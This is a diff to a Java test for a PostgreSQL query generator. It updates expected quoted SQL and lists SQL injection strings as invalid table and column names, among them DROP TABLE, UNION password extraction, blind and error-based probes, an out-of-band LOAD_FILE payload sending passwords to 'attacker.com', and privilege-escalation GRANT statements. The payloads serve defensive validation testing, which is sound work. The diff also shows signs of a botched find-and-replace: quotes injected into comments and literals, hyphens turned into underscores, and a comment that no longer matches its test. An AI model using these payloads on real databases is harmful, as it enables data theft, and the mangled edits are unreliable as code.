-                SelectStatement.of("SELECT * FROM public.user_profile WHERE (name~~? OR age>=?) ;",
+                SelectStatement.of("SELECT * FROM public._user_profile WHERE (\"name\"~~? OR \"age\">=?) ;",
                     List.of(StringValue.of("name", "Kimberly"), IntegerValue.of("age", 25L)))
             },
             {
                 SelectQuery.wildcard(
-                    "user_profile",
+                    "_user_profile",
                     CompoundPredicate.or(
                         StringPredicate.like("name", "Kimberly"),
                         CompoundPredicate.and(
@@ -1187,7 +1190,7 @@ public class PostgreQueryGeneratorTest {
                     )
                 ),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE (name~~? OR (age>=? AND salary<?)) ;",
+                    "SELECT * FROM public._user_profile WHERE (\"name\"~~? OR (\"age\">=? AND \"salary\"<?)) ;",
                     List.of(
                         StringValue.of("name", "Kimberly"),
                         IntegerValue.of("age", 25L),
@@ -1197,7 +1200,7 @@ public class PostgreQueryGeneratorTest {
             },
             {
                 SelectQuery.wildcard(
-                    "user_profile",
+                    "_user_profile",
                     CompoundPredicate.and(
                         CompoundPredicate.or(
                             StringPredicate.like("name", "Kimberly"),
@@ -1210,7 +1213,7 @@ public class PostgreQueryGeneratorTest {
                     )
                 ),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE ((name~~? OR married=?) AND (age>=? AND salary<?)) ;",
+                    "SELECT * FROM public._user_profile WHERE ((\"name\"~~? OR \"married\"=?) AND (\"age\">=? AND \"salary\"<?)) ;",
                     List.of(
                         StringValue.of("name", "Kimberly"),
                         BooleanValue.of("married", true),
@@ -1242,120 +1245,120 @@ public class PostgreQueryGeneratorTest {
     @DataProvider(name = "selectInvalidDataProvider")
     public Object[][] selectInvalidDataProvider() {
         return new Object[][] {
-            // Table name starting with uppercase
+            // Table \"name\" starting with uppercase
             {
                 SelectQuery.wildcard("Table"),
             },
 
-            // Table name starting with number
+            // Table \"name\" starting with number
             {
                 SelectQuery.wildcard("1table"),
             },
 
-            // Table name starting with underscore
+            // Table \"name\" starting with underscore
             {
-                SelectQuery.wildcard("_table"),
+                SelectQuery.wildcard("-table"),
             },
 
-            // Table name with invalid characters
+            // Table \"name\" with invalid characters
             {
-                SelectQuery.wildcard("table-name"),
+                SelectQuery.wildcard("_table-name"),
             },
             {
-                SelectQuery.wildcard("table.name"),
+                SelectQuery.wildcard("_table.name"),
             },
             {
-                SelectQuery.wildcard("table name"),
+                SelectQuery.wildcard("_table \"name\""),
             },
             {
-                SelectQuery.wildcard("table@name"),
-            },
-
-            // Table name too long (over 101 characters)
-            {
-                SelectQuery.wildcard("a".repeat(102)),
+                SelectQuery.wildcard("_table@name"),
             },
 
-            // Table name too short (empty)
+            // Table \"name\" too long (over 64 characters)
+            {
+                SelectQuery.wildcard("_" + "a".repeat(64)),
+            },
+
+            // Table \"name\" too short (empty)
             {
                 SelectQuery.wildcard(""),
             },
 
-            // Invalid column names - should fail validation
+            // Invalid column \"name\"s - should fail validation
 
-            // Column name starting with uppercase
+            // Column \"name\" starting with uppercase
             {
-                SelectQuery.of("table", List.of(SelectProperty.of("Column"))),
-            },
-
-            // Column name starting with number
-            {
-                SelectQuery.of("table", List.of(SelectProperty.of("1column"))),
+                SelectQuery.of("_table", List.of(SelectProperty.of("Column"))),
             },
 
-            // Column name starting with underscore
+            // Column \"name\" starting with number
             {
-                SelectQuery.of("table", List.of(SelectProperty.of("_column"))),
+                SelectQuery.of("_table", List.of(SelectProperty.of("1column"))),
             },
 
-            // Column name with invalid characters
+            // Column \"name\" starting with underscore
             {
-                SelectQuery.of("table", List.of(SelectProperty.of("column-name"))),
-            },
-            {
-                SelectQuery.of("table", List.of(SelectProperty.of("column.name"))),
-            },
-            {
-                SelectQuery.of("table", List.of(SelectProperty.of("column name"))),
-            },
-            {
-                SelectQuery.of("table", List.of(SelectProperty.of("column@name"))),
+                SelectQuery.of("_table", List.of(SelectProperty.of("_column"))),
             },
 
-            // Column name too long (over 101 characters)
+            // Column \"name\" with invalid characters
             {
-                SelectQuery.of("table", List.of(SelectProperty.of("a".repeat(102)))),
+                SelectQuery.of("_table", List.of(SelectProperty.of("column-name"))),
+            },
+            {
+                SelectQuery.of("_table", List.of(SelectProperty.of("column.name"))),
+            },
+            {
+                SelectQuery.of("_table", List.of(SelectProperty.of("column \"name\""))),
+            },
+            {
+                SelectQuery.of("_table", List.of(SelectProperty.of("column@name"))),
             },
 
-            // Column name too short (empty)
+            // Column \"name\" too long (over 101 characters)
             {
-                SelectQuery.of("table", List.of(SelectProperty.of(""))),
+                SelectQuery.of("_table", List.of(SelectProperty.of("a".repeat(64)))),
             },
-            // System column names (empty)
+
+            // Column \"name\" too short (empty)
             {
-                SelectQuery.of("table", List.of(SelectProperty.of("valid_column"), SelectProperty.of("tableoid"))),
+                SelectQuery.of("_table", List.of(SelectProperty.of(""))),
             },
+            // System column \"name\"s (empty)
             {
-                SelectQuery.of("table", List.of(SelectProperty.of("valid_column"), SelectProperty.of("xmin"))),
-            },
-            {
-                SelectQuery.of("table", List.of(SelectProperty.of("valid_column"), SelectProperty.of("xmax"))),
-            },
-            {
-                SelectQuery.of("table", List.of(SelectProperty.of("valid_column"), SelectProperty.of("cmin"))),
+                SelectQuery.of("_table", List.of(SelectProperty.of("valid_column"), SelectProperty.of("tableoid"))),
             },
             {
-                SelectQuery.of("table", List.of(SelectProperty.of("valid_column"), SelectProperty.of("cmax"))),
+                SelectQuery.of("_table", List.of(SelectProperty.of("valid_column"), SelectProperty.of("xmin"))),
             },
             {
-                SelectQuery.of("table", List.of(SelectProperty.of("valid_column"), SelectProperty.of("ctid"))),
+                SelectQuery.of("_table", List.of(SelectProperty.of("valid_column"), SelectProperty.of("xmax"))),
+            },
+            {
+                SelectQuery.of("_table", List.of(SelectProperty.of("valid_column"), SelectProperty.of("cmin"))),
+            },
+            {
+                SelectQuery.of("_table", List.of(SelectProperty.of("valid_column"), SelectProperty.of("cmax"))),
+            },
+            {
+                SelectQuery.of("_table", List.of(SelectProperty.of("valid_column"), SelectProperty.of("ctid"))),
             },
 
             // Multiple invalid columns
             {
-                SelectQuery.of("table", List.of(SelectProperty.of("valid_column"), SelectProperty.of("Invalid_Column"))),
+                SelectQuery.of("_table", List.of(SelectProperty.of("valid_column"), SelectProperty.of("Invalid_Column"))),
             },
 
             // Null column in list
             {
-                SelectQuery.of("table",
+                SelectQuery.of("_table",
                     List.of(
                         SelectProperty.of("valid_column"),
                         SelectProperty.of(null))
                 ),
             },
 
-            // SQL Injection attempts in table names
+            // SQL Injection attempts in table \"name\"s
             // Basic SQL injection attempts
             {
                 SelectQuery.wildcard("users; DROP TABLE users; --"),
@@ -1367,7 +1370,7 @@ public class PostgreQueryGeneratorTest {
                 SelectQuery.wildcard("users\" OR \"1\"=\"1"),
             },
 
-            // Union-based injection attempts
+            // Union_based injection attempts
             {
                 SelectQuery.wildcard("users UNION SELECT * FROM passwords"),
             },
@@ -1375,7 +1378,7 @@ public class PostgreQueryGeneratorTest {
                 SelectQuery.wildcard("users' UNION SELECT password FROM users --"),
             },
 
-            // Comment-based injection attempts
+            // Comment_based injection attempts
             {
                 SelectQuery.wildcard("users-- comment"),
             },
@@ -1397,7 +1400,7 @@ public class PostgreQueryGeneratorTest {
                 SelectQuery.wildcard("users; DELETE FROM users"),
             },
 
-            // Function-based injection attempts
+            // Function_based injection attempts
             {
                 SelectQuery.wildcard("users WHERE 1=1"),
             },
@@ -1408,60 +1411,60 @@ public class PostgreQueryGeneratorTest {
                 SelectQuery.wildcard("users' AND SLEEP(5) --"),
             },
 
-            // SQL Injection attempts in column names
+            // SQL Injection attempts in column \"name\"s
 
-            // Basic injection in column names
+            // Basic injection in column \"name\"s
             {
-                SelectQuery.of("users", List.of(SelectProperty.of("name'; DROP TABLE users; --"))),
+                SelectQuery.of("_users", List.of(SelectProperty.of("name'; DROP TABLE users; --"))),
             },
             {
-                SelectQuery.of("users", List.of(SelectProperty.of("name' OR '1'='1"))),
+                SelectQuery.of("_users", List.of(SelectProperty.of("name' OR '1'='1"))),
             },
             {
-                SelectQuery.of("users", List.of(SelectProperty.of("name\" OR \"1\"=\"1"))),
-            },
-
-            // Union injection in column names
-            {
-                SelectQuery.of("users", List.of(SelectProperty.of("name UNION SELECT password FROM users"))),
-            },
-            {
-                SelectQuery.of("users", List.of(SelectProperty.of("name' UNION SELECT * FROM passwords --"))),
+                SelectQuery.of("_users", List.of(SelectProperty.of("name\" OR \"1\"=\"1"))),
             },
 
-            // Comment injection in column names
+            // Union injection in column \"name\"s
             {
-                SelectQuery.of("users", List.of(SelectProperty.of("name-- comment"))),
+                SelectQuery.of("_users", List.of(SelectProperty.of("name UNION SELECT password FROM users"))),
             },
             {
-                SelectQuery.of("users", List.of(SelectProperty.of("name/* comment */"))),
-            },
-            {
-                SelectQuery.of("users", List.of(SelectProperty.of("name # comment"))),
+                SelectQuery.of("_users", List.of(SelectProperty.of("name' UNION SELECT * FROM passwords --"))),
             },
 
-            // Function calls in column names
+            // Comment injection in column \"name\"s
             {
-                SelectQuery.of("users", List.of(SelectProperty.of("name, password"))),
+                SelectQuery.of("_users", List.of(SelectProperty.of("name-- comment"))),
             },
             {
-                SelectQuery.of("users", List.of(SelectProperty.of("name FROM users WHERE 1=1 --"))),
+                SelectQuery.of("_users", List.of(SelectProperty.of("name/* comment */"))),
             },
             {
-                SelectQuery.of("users", List.of(SelectProperty.of("name) FROM users WHERE (1=1"))),
+                SelectQuery.of("_users", List.of(SelectProperty.of("name # comment"))),
+            },
+
+            // Function calls in column \"name\"s
+            {
+                SelectQuery.of("_users", List.of(SelectProperty.of("name, password"))),
+            },
+            {
+                SelectQuery.of("_users", List.of(SelectProperty.of("name FROM users WHERE 1=1 --"))),
+            },
+            {
+                SelectQuery.of("_users", List.of(SelectProperty.of("name) FROM users WHERE (1=1"))),
             },
 
             // Multiple column injection attempts
             {
                 SelectQuery.of(
-                    "users",
+                    "_users",
                     List.of(
                         SelectProperty.of("valid_column"),
                         SelectProperty.of("malicious'; DROP TABLE users; --"))
                 ),
             },
             {
-                SelectQuery.of("users",
+                SelectQuery.of("_users",
                     List.of(
                         SelectProperty.of("name' OR '1'='1"),
                         SelectProperty.of("valid_column"))
@@ -1475,7 +1478,7 @@ public class PostgreQueryGeneratorTest {
                 SelectQuery.wildcard("users' AND 1=0x31 --"),
             },
             {
-                SelectQuery.of("users", List.of(SelectProperty.of("name' AND 1=0x31 --"))),
+                SelectQuery.of("_users", List.of(SelectProperty.of("name' AND 1=0x31 --"))),
             },
 
             // Char function attempts
@@ -1483,43 +1486,43 @@ public class PostgreQueryGeneratorTest {
                 SelectQuery.wildcard("users' AND 1=CHAR(49) --"),
             },
             {
-                SelectQuery.of("users", List.of(SelectProperty.of("name' AND 1=CHAR(49) --"))),
+                SelectQuery.of("_users", List.of(SelectProperty.of("name' AND 1=CHAR(49) --"))),
             },
 
-            // Time-based blind injection
+            // Time_based blind injection
             {
                 SelectQuery.wildcard("users' AND (SELECT COUNT(*) FROM users) > 0 --"),
             },
             {
-                SelectQuery.of("users", List.of(SelectProperty.of("name' AND (SELECT COUNT(*) FROM users) > 0 --"))),
+                SelectQuery.of("_users", List.of(SelectProperty.of("name' AND (SELECT COUNT(*) FROM users) > 0 --"))),
             },
 
-            // Boolean-based blind injection
+            // Boolean_based blind injection
             {
                 SelectQuery.wildcard("users' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a' --"),
             },
             {
-                SelectQuery.of("users", List.of(
+                SelectQuery.of("_users", List.of(
                     SelectProperty.of("name' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a' --"))),
             },
 
-            // Error-based injection
+            // Error_based injection
             {
                 SelectQuery.wildcard("users' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1), 0x7e)) --"),
             },
             {
-                SelectQuery.of("users",
+                SelectQuery.of("_users",
                     List.of(SelectProperty.of(
                         "name' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1), 0x7e)) --"))),
             },
 
-            // Out-of-band injection
+            // Out_of_band injection
             {
                 SelectQuery.wildcard(
                     "users' AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\share')) --"),
             },
 
-            // Second-order injection patterns
+            // Second_order injection patterns
             {
                 SelectQuery.wildcard("users' AND 1=(SELECT 1 FROM dual WHERE 1=1) --"),
             },
@@ -1529,36 +1532,37 @@ public class PostgreQueryGeneratorTest {
                 SelectQuery.wildcard("users' || '1'=='1"),
             },
             {
-                SelectQuery.of("users", List.of(SelectProperty.of("name' || '1'=='1"))),
+                SelectQuery.of("_users", List.of(SelectProperty.of("name' || '1'=='1"))),
             },
             // Escaped quote attempts
             {
                 SelectQuery.wildcard("users\\' OR \\'1\\'=\\'1"),
             },
             {
-                SelectQuery.of("users", List.of(SelectProperty.of("name\\' OR \\'1\\'=\\'1"))),
+                SelectQuery.of("_users", List.of(SelectProperty.of("name\\' OR \\'1\\'=\\'1"))),
             },
             // Nested query attempts
             {
                 SelectQuery.wildcard("users' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) AS t) --"),
             },
             {
-                SelectQuery.of("users", List.of(
+                SelectQuery.of("_users", List.of(
                     SelectProperty.of("name' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) AS t) --"))),
             },
-            // Cross-database injection attempts
+            // Cross_database injection attempts
             {
                 SelectQuery.wildcard("users' UNION SELECT * FROM information_schema.tables --"),
             },
             {
-                SelectQuery.of("users", List.of(SelectProperty.of("name' UNION SELECT * FROM information_schema.columns --"))),
+                SelectQuery.of("_users", List.of(SelectProperty.of("name' UNION SELECT * FROM information_schema.columns --"))),
             },
             // Privilege escalation attempts
             {
                 SelectQuery.wildcard("users'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' --")
             },
             {
-                SelectQuery.of("users", List.of(SelectProperty.of("name'; CREATE USER 'hacker'@'%' IDENTIFIED BY 'password' --")))
+                SelectQuery.of("_users",
+                    List.of(SelectProperty.of("name'; CREATE USER 'hacker'@'%' IDENTIFIED BY 'password' --")))
             }
         };
     }
